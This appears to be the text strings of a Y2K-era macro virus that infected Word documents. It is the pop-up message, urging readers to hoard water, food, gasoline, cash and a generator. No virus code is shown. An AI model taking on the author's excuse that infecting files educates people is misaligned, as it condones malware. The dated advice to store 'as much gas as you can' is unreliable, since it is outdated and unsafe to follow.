The year 2000 is fast approaching, and the word still needs to be spread about the implications and dangers of the millennium bug commonly referred to as the Y2K bug. The virus that has infected this word document was written to help spread the word about the Y2K bug, and educate you so you can prepare yourself and your family for Saturday January 1, 2000.",

Although I don't personally believe there will be food shortages, power shortages, gas shortages as a result of a computer bug, there will be food, power and gas shortages by hoarding nitwits that fear the millennium bug. As a result, I highly recommend that you begin to stockpile bottled water (1-month supply), canned food (1-month supply), and as much gas as you can store (keep your vehicle gas tank always topped up starting December 1st).",

If you're in a northern climate, like the Great White North (Canada), I suggest you consider purchasing a good airtight wood stove, and at least a face cord of wood. Even if there are no disruptions in natural gas, or oil, or electricity, the wood stove is a great way of reducing your heating bills. And if there is a problem, you will be comfortable in your own heated home, unlike your unprepared neighbors (remember the Canadian ice storm last year!)' P",

This month I would like to suggest that you purchase a portable generator and enough gas cans to store gas to power the generator. The generator can be used to power lighting and small electrical appliances should the power be disrupted.",

These items will be invaluable during those cold, dark nights should the power companies fail in their Y2K conversion. Don't plan on relying on the banks or credit/debit cards. Start each month, and stash away enough money to last you at least 2 months. This money should include enough money to pay the rent/mortgage, utilities, FOOD, etc. Remember cold hard cash is accept EVERYWHERE.' P",
